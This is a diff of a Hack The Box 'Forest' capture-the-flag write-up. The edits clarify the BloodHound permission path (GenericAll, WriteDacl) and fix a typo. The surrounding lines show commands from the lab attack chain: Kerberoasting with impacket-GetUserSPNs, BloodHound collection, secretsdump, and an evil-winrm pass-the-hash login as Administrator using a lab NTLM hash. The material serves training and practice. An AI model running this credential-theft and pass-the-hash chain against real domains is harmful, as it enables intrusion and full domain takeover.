@@ -5,7 +5,7 @@ impacket-GetUserSPNs -request -dc-ip 10.129.2.15  htb.local/svc-alfresco:s3rvice
 sudo bloodhound-ce-python -d htb.local -dc forest.htb.local -ns 10.129.2.15 -u 'svc-alfresco' -p 's3rvice' -c all
 ```
 
-BloodHound shows that `svc-alfresco` is a member of the "ACCOUNT OPERATORS" group, which has permissions on the "EXCHANGE WINDOWS PERMISSIONS" group, which in return has WriteDacl permissions on the domain:
+BloodHound shows that `svc-alfresco` is a member of the "ACCOUNT OPERATORS" group, which has "GenericAll" permissions on the "EXCHANGE WINDOWS PERMISSIONS" group, which in return has "WriteDacl" permissions on the domain:
 ![[Pasted image 20251203145121.png]]
 
 According to the official documentation:
@@ -50,7 +50,7 @@ impacket-secretsdump htb/john@10.129.2.15
 # ...
 ```
 
-# Evil-winrm as Adminstrator
+# Evil-winrm as Administrator
 
 ```bash
 evil-winrm -i 10.129.2.15 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
